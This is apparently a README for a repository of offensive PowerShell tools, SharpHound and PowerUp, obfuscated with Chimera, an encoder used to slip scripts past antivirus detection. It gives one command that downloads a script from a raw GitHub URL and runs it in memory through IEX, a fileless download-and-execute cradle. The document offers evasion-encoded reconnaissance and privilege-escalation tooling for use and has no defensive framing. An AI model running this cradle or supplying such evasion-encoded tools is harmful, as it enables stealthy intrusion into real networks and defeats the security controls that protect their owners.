# A Collection of encoded powershell tools. All encoding done via Chimera

Tools added:
* SharpHound
* PowerUp


# Run PowerShell in memory

``` pwsh
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/OverflowMyBuffers/whatever-script.ps1') | IEX
```
